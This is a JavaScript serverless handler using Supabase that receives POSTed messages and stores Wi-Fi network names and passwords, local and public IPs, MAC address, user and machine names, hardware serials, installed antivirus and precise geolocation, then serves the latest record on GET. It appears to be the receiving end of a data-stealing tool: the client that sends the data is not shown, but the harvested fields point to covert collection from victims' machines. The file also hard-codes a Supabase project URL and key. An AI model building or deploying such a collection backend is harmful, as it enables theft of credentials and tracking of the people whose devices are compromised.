const { createClient } = require('@supabase/supabase-js');

const supabase = createClient(
    "https://znbejmlgkpwynfirhqvk.supabase.co",
    "sb_publishable_UMEpP7jQskh4KoEMTSe2EA_SpQatu1E"
);

exports.handler = async (event) => {
    if (event.httpMethod === "POST") {
        const params = new URLSearchParams(event.body);
        const message = params.get("message");

        const get = (prefix) => {
            const regex = new RegExp(prefix + "([^~]+)");
            const match = message.match(regex);
            return match ? match[1].trim() : "";
        };

        await supabase.from("wifi").insert([{
            reseau:      get("RESEAU:"),
            mot_de_passe: get("MDP:"),
            signal:      get("SIGNAL:"),
            ip:          get("IP:"),
            passerelle:  get("GW:"),
            mac:         get("MAC:"),
            pc:          get("PC:"),
            user_pc:     get("USER:"),
            os:          get("OS:"),
            cpu:         get("CPU:"),
            gpu:         get("GPU:"),
            ram:         get("RAM:"),
            disque:      get("DISK:"),
            modele:      get("MODELE:"),
            fabricant:   get("FABRICANT:"),
            serial:      get("SERIAL:"),
            av:          get("AV:"),
            ip_public:   get("IPPUBLIC:"),
            ville:       get("VILLE:"),
            pays:        get("PAYS:"),
            region:      get("REGION:"),
            cp:          get("CP:"),
            fai:         get("FAI:"),
            lat:         get("LAT:"),
            lon:         get("LON:"),
        }]);

        return { statusCode: 200, body: JSON.stringify({ success: true }) };
    }

    if (event.httpMethod === "GET") {
        const { data } = await supabase.from("wifi").select("*").order("created_at", { ascending: false }).limit(1);
        return { statusCode: 200, body: JSON.stringify(data[0]) };
    }

    return { statusCode: 405, body: "Method Not Allowed" };
};
